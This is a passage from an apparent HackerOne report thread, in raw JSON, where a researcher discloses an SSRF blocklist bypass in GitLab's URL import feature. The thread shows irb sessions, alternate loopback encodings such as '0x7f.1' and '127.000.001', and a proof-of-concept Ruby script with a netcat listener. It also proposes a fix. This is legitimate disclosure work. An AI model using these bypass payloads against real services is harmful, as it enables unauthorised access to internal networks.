48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026amp;X-Amz-Signature=8792f8c136dad929475253d662325f8c29b81b48ba69961bf5e37b40c62cee9c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI am currently investigating another potential bypass by playing around with DNS TOCTOU.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T20:06:24.527Z","updated_at":"2017-11-02T20:06:24.527Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":235808,"filename":"new_bypass.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/235/808/795498bfda3437279ccc7295184cab818c86a72b/new_bypass.png?response-content-disposition=attachment%3B%20filename%3D%22new_bypass.png%22%3B%20filename%2A%3DUTF-8%27%27new_bypass.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045811Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=8792f8c136dad929475253d662325f8c29b81b48ba69961bf5e37b40c62cee9c"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2131216,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Summary\n\nAh, now this is interesting. It appears that the root cause is in fact a combination of the Ruby resolver and the fact that you rely on it. It seems that it cannot be relied upon for security measures especially when it comes to blacklisting addresses. This should probably be documented somewhere.\n\n# Details\n\nThe following function blacklists addresses on GitLab: \n\n```ruby\ndef blocked_url?(url)\n       return false if url.nil?\n\n       blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n       blocked_ips.concat(Socket.ip_address_list.map(\u0026:ip_address))\n\n       begin\n         uri = Addressable::URI.parse(url)\n         # Allow imports from the GitLab instance itself but only from the configured ports\n         return false if internal?(uri)\n\n         return true if blocked_port?(uri.port)\n         return true if blocked_user_or_hostname?(uri.user)\n         return true if blocked_user_or_hostname?(uri.hostname)\n\n         server_ips = Resolv.getaddresses(uri.hostname)\n         return true if (blocked_ips \u0026 server_ips).any?\n       rescue Addressable::URI::InvalidURIError\n         return true\nend\n```\n\nHere you are relying on Ruby's native resolver:\n\n```ruby\nserver_ips = Resolv.getaddresses(uri.hostname)\n```\n\nWe can replicate this on my machine:\n\n```\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e uri = \"0x7f.1\"\n=\u003e \"0x7f.1\"\nirb(main):003:0\u003e server_ips = Resolv.getaddresses(uri)\n=\u003e []\nirb(main):004:0\u003e blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=\u003e [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):005:0\u003e return true if (blocked_ips \u0026 server_ips).any?\n=\u003e nil\n```\n\n# The Bug\n\nWhile playing around with different machines running Ubuntu, I noticed the following strange behaviour by Ruby's native resolver.\n\n| 💻 Machine 1                                        | 💻 Machine 2                                        |\n|--------------------------------------------------|--------------------------------------------------|\n| ```ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]``` | ```ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]``` |\n\n1) **💻 Machine 1**:\n\n```\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e uri = \"0x7f.1\"\n=\u003e \"0x7f.1\"\nirb(main):003:0\u003e server_ips = Resolv.getaddresses(uri)\n=\u003e []\nirb(main):004:0\u003e blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=\u003e [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):005:0\u003e return true if (blocked_ips \u0026 server_ips).any?\n=\u003e nil\n```\n\n2) **💻 Machine 2**\n\n```\nirb(main):008:0\u003e Resolv.getaddresses(\"127.0.0.1\")\n=\u003e [\"127.0.0.1\"]\nirb(main):009:0\u003e Resolv.getaddresses(\"localhost\")\n=\u003e [\"127.0.0.1\"]\nirb(main):010:0\u003e Resolv.getaddresses(\"127.000.000.1\")\n=\u003e []\n```\n\n3) **💻 Machine 1**\n\n```\nirb(main):002:0\u003e Resolv.getaddresses(\"127.000.000.1\")\n=\u003e [\"127.0.0.1\"]\n```\n\nThis clears most things up for me now. It was probably difficult to replicate this issue, because it depends on the machine/OS you are running `Resolv` on. This also explains the unusual delay times and loops for certain payloads.\n\nI will investigate this further and maybe contact the Ruby developers to see what they have to say.\n\n---\n\nConcerning you last statement:\n\n\u003e Since we have no easy way to determine for sure what strings every OS will translate automatically it's safer to simply deny connections to hosts without DNS entries altogether.\n\nI would suggest using `Socket.getaddrinfo()` in order to determine what the OS thinks the address is and then perform the other tasks in `url_blocker.rb`.\n\n```\nirb(main):001:0\u003e require 'socket'\n=\u003e true\nirb(main):002:0\u003e Socket.getaddrinfo(\"0x7f.1\", nil)\n=\u003e [[\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 1, 6], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 2, 17], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 3, 0]]\nirb(main):003:0\u003e Socket.getaddrinfo(\"0177.1\", nil)\n=\u003e [[\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 1, 6], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 2, 17], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 3, 0]]\nirb(main):004:0\u003e Socket.getaddrinfo(\"2130706433\", nil)\n=\u003e [[\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 1, 6], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 2, 17], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 3, 0]]\n```\n\n---\n\nAlso just to add to the list of bypasses, here is another one that actually resolves using Ruby's Resolv on **💻 Machine 1**, but completely bypasses your exclusion list:\n\n```\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e Resolv.getaddress \"127.000.000.001\"\n=\u003e \"127.0.0.1\"\n```\n\nYou can verify this by importing `http://127.000.000.001:22/`.","markdown_message":"\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003cp\u003eAh, now this is interesting. It appears that the root cause is in fact a combination of the Ruby resolver and the fact that you rely on it. It seems that it cannot be relied upon for security measures especially when it comes to blacklisting addresses. This should probably be documented somewhere.\u003c/p\u003e\n\n\u003ch1 id=\"details\"\u003eDetails\u003c/h1\u003e\n\n\u003cp\u003eThe following function blacklists addresses on GitLab: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eblocked_url?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n       \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003efalse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enil?\u003c/span\u003e\n\n       \u003cspan class=\"n\"\u003eblocked_ips\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;127.0.0.1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;::1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;0.0.0.0\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n       \u003cspan class=\"n\"\u003eblocked_ips\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003econcat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eip_address_list\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"ss\"\u003e:ip_address\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n       \u003cspan class=\"k\"\u003ebegin\u003c/span\u003e\n         \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eAddressable\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eURI\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n         \u003cspan class=\"c1\"\u003e# Allow imports from the GitLab instance itself but only from the configured ports\u003c/span\u003e\n         \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003efalse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003einternal?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n         \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eblocked_port?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n         \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eblocked_user_or_hostname?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n         \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eblocked_user_or_hostname?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ehostname\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n         \u003cspan class=\"n\"\u003eserver_ips\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eResolv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egetaddresses\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ehostname\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n         \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblocked_ips\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eserver_ips\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eany?\u003c/span\u003e\n       \u003cspan class=\"k\"\u003erescue\u003c/span\u003e \u003cspan class=\"no\"\u003eAddressable\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eURI\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eInvalidURIError\u003c/span\u003e\n         \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere you are relying on Ruby\u0026#39;s native resolver:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eserver_ips\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eResolv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egetaddresses\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ehostname\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can replicate this on my machine:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; uri = \u0026quot;0x7f.1\u0026quot;\n=\u0026gt; \u0026quot;0x7f.1\u0026quot;\nirb(main):003:0\u0026gt; server_ips = Resolv.getaddresses(uri)\n=\u0026gt; []\nirb(main):004:0\u0026gt; blocked_ips = [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\nirb(main):005:0\u0026gt; return true if (blocked_ips \u0026amp; server_ips).any?\n=\u0026gt; nil\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"the-bug\"\u003eThe Bug\u003c/h1\u003e\n\n\u003cp\u003eWhile playing around with different machines running Ubuntu, I noticed the following strange behaviour by Ruby\u0026#39;s native resolver.\u003c/p\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e💻 Machine 1\u003c/th\u003e\n\u003cth\u003e💻 Machine 2\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003e1) \u003cstrong\u003e💻 Machine 1\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; uri = \u0026quot;0x7f.1\u0026quot;\n=\u0026gt; \u0026quot;0x7f.1\u0026quot;\nirb(main):003:0\u0026gt; server_ips = Resolv.getaddresses(uri)\n=\u0026gt; []\nirb(main):004:0\u0026gt; blocked_ips = [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\nirb(main):005:0\u0026gt; return true if (blocked_ips \u0026amp; server_ips).any?\n=\u0026gt; nil\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) \u003cstrong\u003e💻 Machine 2\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):008:0\u0026gt; Resolv.getaddresses(\u0026quot;127.0.0.1\u0026quot;)\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;]\nirb(main):009:0\u0026gt; Resolv.getaddresses(\u0026quot;localhost\u0026quot;)\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;]\nirb(main):010:0\u0026gt; Resolv.getaddresses(\u0026quot;127.000.000.1\u0026quot;)\n=\u0026gt; []\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3) \u003cstrong\u003e💻 Machine 1\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):002:0\u0026gt; Resolv.getaddresses(\u0026quot;127.000.000.1\u0026quot;)\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis clears most things up for me now. It was probably difficult to replicate this issue, because it depends on the machine/OS you are running \u003ccode\u003eResolv\u003c/code\u003e on. This also explains the unusual delay times and loops for certain payloads.\u003c/p\u003e\n\n\u003cp\u003eI will investigate this further and maybe contact the Ruby developers to see what they have to say.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eConcerning you last statement:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSince we have no easy way to determine for sure what strings every OS will translate automatically it\u0026#39;s safer to simply deny connections to hosts without DNS entries altogether.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI would suggest using \u003ccode\u003eSocket.getaddrinfo()\u003c/code\u003e in order to determine what the OS thinks the address is and then perform the other tasks in \u003ccode\u003eurl_blocker.rb\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;socket\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; Socket.getaddrinfo(\u0026quot;0x7f.1\u0026quot;, nil)\n=\u0026gt; [[\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 1, 6], [\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 2, 17], [\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 3, 0]]\nirb(main):003:0\u0026gt; Socket.getaddrinfo(\u0026quot;0177.1\u0026quot;, nil)\n=\u0026gt; [[\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 1, 6], [\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 2, 17], [\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 3, 0]]\nirb(main):004:0\u0026gt; Socket.getaddrinfo(\u0026quot;2130706433\u0026quot;, nil)\n=\u0026gt; [[\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 1, 6], [\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 2, 17], [\u0026quot;AF_INET\u0026quot;, 0, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, 2, 3, 0]]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003chr\u003e\n\n\u003cp\u003eAlso just to add to the list of bypasses, here is another one that actually resolves using Ruby\u0026#39;s Resolv on \u003cstrong\u003e💻 Machine 1\u003c/strong\u003e, but completely bypasses your exclusion list:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; Resolv.getaddress \u0026quot;127.000.000.001\u0026quot;\n=\u0026gt; \u0026quot;127.0.0.1\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou can verify this by importing \u003ccode\u003ehttp://127.000.000.001:22/\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-03T11:54:17.498Z","updated_at":"2017-11-03T11:54:17.498Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2131402,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a simplified proof of concept:\n\n```\n$ ruby -v\nruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]\n$ irb\nirb(main):001:0\u003e require 'resolv'\n=\u003e true\nirb(main):002:0\u003e uri = \"0x7f.1\"\n=\u003e \"0x7f.1\"\nirb(main):003:0\u003e server_ips = Resolv.getaddresses(uri)\n=\u003e []\nirb(main):004:0\u003e blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=\u003e [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):005:0\u003e (blocked_ips \u0026 server_ips).any?\n=\u003e false\nirb(main):006:0\u003e uri = \"127.000.001\"\n=\u003e \"127.000.001\"\nirb(main):007:0\u003e server_ips = Resolv.getaddresses(uri)\n=\u003e []\nirb(main):008:0\u003e blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=\u003e [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):009:0\u003e (blocked_ips \u0026 server_ips).any?\n=\u003e false\n```\n\nHere is a proof of concept that demonstrates the dangers of relying on Ruby's native resolver for security-related features.\n\n1) Fire up a listener in one tab:\n\n```\n$ echo -e \"HTTP/1.1 200 OK\\n\\nHello from netcat :)\" | sudo nc -l 80\n```\n\n2) Run {F236086}:\n\n```\n$ cat poc.rb\nrequire 'resolv'\nrequire 'uri'\nrequire 'net/http'\n\nputs \"IP to test:\"\nhost = gets.strip\n\naddrs = Resolv.getaddresses(host)\nputs \"Result of Resolv.getaddresses():\"\nputs addrs\nputs \"(#{addrs.length} address(es))\"\n\nuri = URI.parse(\"http://#{host}/\")\nresponse = Net::HTTP.get_response uri\nputs \"Result of fetching http://#{host}/:\"\nputs response.body\n$ ruby poc.rb\nIP to test:\n127.000.001\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://127.000.001/:\nHello from netcat :)\n$ ruby poc.rb\nIP to test:\n0x7f.1\nResult of Resolv.getaddresses():\n(0 address(es))\nResult of fetching http://0x7f.1/:\nHello from netcat :)\n```","markdown_message":"\u003cp\u003eHere is a simplified proof of concept:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ruby -v\nruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]\n$ irb\nirb(main):001:0\u0026gt; require \u0026#39;resolv\u0026#39;\n=\u0026gt; true\nirb(main):002:0\u0026gt; uri = \u0026quot;0x7f.1\u0026quot;\n=\u0026gt; \u0026quot;0x7f.1\u0026quot;\nirb(main):003:0\u0026gt; server_ips = Resolv.getaddresses(uri)\n=\u0026gt; []\nirb(main):004:0\u0026gt; blocked_ips = [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\n=\u0026gt; [\u0026quot;127.0.0.1\u0026quot;, \u0026quot;::1\u0026quot;, \u0026quot;0.0.0.0\u0026quot;]\nirb(main):005:0\u0026gt; (blocked_ips \u0026amp; server_ips).any?\n=\u0026gt; false\nirb(main):006:0\u0026gt; uri = \u0026quot;127.000.001\u0026quot;\n=\u0026gt; 